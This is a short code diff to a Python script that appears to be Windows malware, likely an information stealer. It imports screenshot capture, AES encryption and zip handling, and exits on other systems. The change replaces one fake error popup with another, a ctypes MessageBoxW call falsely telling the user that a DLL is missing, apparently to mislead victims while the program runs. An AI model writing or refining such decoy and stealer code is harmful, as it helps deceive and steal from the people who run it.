@@ -35,13 +35,12 @@ from zipfile import ZipFile
 from Crypto.Cipher import AES
 from PIL import ImageGrab
 import platform
-import pymsgbox
-    
+import ctypes    
 
 if platform.system() != "Windows":
     exit()
 
-pymsgbox.alert('Can\'t start program. Error code 0x702AF38', 'Error', 'OK')
+ctypes.windll.user32.MessageBoxW(0, "Some dll are missing on your computer (VLg7.dll)", "DDL missing", 16)
 
 
 def writeforfile(data, name):
